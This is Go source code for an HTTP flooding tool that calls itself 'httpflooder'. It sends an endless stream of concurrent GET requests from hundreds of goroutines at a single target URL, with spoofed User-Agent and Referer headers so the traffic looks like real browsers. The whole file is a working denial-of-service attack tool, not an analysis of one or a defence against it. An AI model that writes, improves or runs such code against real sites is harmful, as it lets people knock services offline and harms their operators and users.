// OLD

package main

import (
	"flag"
	"fmt"
	"io"
	_ "io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	_ "regexp"
	"runtime"
	"sync"
	"syscall"
	"time"

	_ "github.com/7IBBE77S/demon/proxymanager"
	_ "github.com/7IBBE77S/demon/requestsender"
)

const __version__ = "1.5"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

var (
	safe            bool
	headersReferers = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
	}
	headersUseragents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	}
)

// ScrapeProxies scrapes proxies from the website and saves them to a file.

func worker(id int, jobs <-chan string, results chan<- uint8, wg *sync.WaitGroup, maxRetries int) {
	client := &http.Client{
		Timeout: 90 * time.Second, // Increased from 60 seconds
	}
	for j := range jobs {
		code := httpCallWithRetries(j, client, maxRetries)
		results <- code

		if code == callGotOk {
			results <- targetComplete
		}
	}

	wg.Done()
}

func httpCallWithRetries(target string, client *http.Client, maxRetries int) uint8 {
	backoffTime := 100 * time.Millisecond // Initial backoff duration

	for retry := 0; retry < maxRetries; retry++ {
		code := httpCall(target, client)
		if code == callGotOk {
			return callGotOk
		}

		time.Sleep(backoffTime) // Wait before retrying
		backoffTime *= 2        // Double the wait for each retry
	}

	return callExitOnErr
}

func httpCall(target string, client *http.Client) uint8 {
	referer := headersReferers[rand.Intn(len(headersReferers))]
	userAgent := headersUseragents[rand.Intn(len(headersUseragents))]

	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return callExitOnErr
	}

	req.Header.Set("Referer", referer)
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return callExitOnErr
	}
	defer resp.Body.Close()

	// Read the response body and calculate its size
	var dataSize int64
	_, err = io.Copy(io.MultiWriter(io.Discard, &sizeWriter{&dataSize}), resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return callExitOnErr
	}

	// Print the size of the response data
	fmt.Printf("Data sent to %s: %d bytes\n", target, dataSize)

	return callGotOk
}

// sizeWriter is a custom writer that keeps track of the data size.
type sizeWriter struct {
	size *int64
}

func (sw *sizeWriter) Write(p []byte) (n int, err error) {
	n = len(p)
	*(sw.size) += int64(n)
	return
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "httpflooder version %s\nUsage: %s [OPTIONS] <url>\nOptions:\n", __version__, os.Args[0])

		flag.PrintDefaults()
	}

	flag.BoolVar(&safe, "safe", false, "prevent damage to sites with protection systems")
	concurrencyPtr := flag.Int("concurrency", 100, "level of concurrency (number of concurrent requests)")
	maxRetriesPtr := flag.Int("max-retries", 3, "maximum number of retries for failed requests")
	flag.Parse()

	args := flag.Args()
	if len(args) != 1 {
		flag.Usage()
		os.Exit(2)
	}

	targetURL := args[0]

	numCPU := runtime.NumCPU()
	numGoroutines := numCPU * 100

	// Adjust concurrency based on user input
	concurrency := *concurrencyPtr
	if concurrency <= 0 {
		fmt.Println("Concurrency level must be a positive integer. Using default concurrency (100).")
		concurrency = 100
	}

	if concurrency > numGoroutines {
		fmt.Printf("Warning: Requested concurrency (%d) exceeds recommended maximum (%d). Adjusting to recommended maximum.\n", concurrency, numGoroutines)
		concurrency = numGoroutines
	}

	jobs := make(chan string, concurrency)
	results := make(chan uint8, concurrency)

	var wg sync.WaitGroup

	for w := 1; w <= numGoroutines; w++ {
		wg.Add(1)
		go worker(w, jobs, results, &wg, *maxRetriesPtr)
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		for {
			select {
			case <-stop:
				fmt.Println("Received stop signal. Stopping workers...")
				close(jobs)
				wg.Wait()
				close(results)
				return
			default:
				jobs <- targetURL
			}
		}
	}()

	okCount := 0
	completeCount := 0

	for res := range results {
		switch res {
		case callGotOk:
			okCount++
		case targetComplete:
			completeCount++
		case callExitOnTooManyFiles:
			fmt.Println("Too many open files. Consider increasing the ulimit.")
		case callExitOnErr:
			// Do nothing
		}
	}

	fmt.Println("Successful calls:", okCount)
	fmt.Println("Complete targets:", completeCount)
}
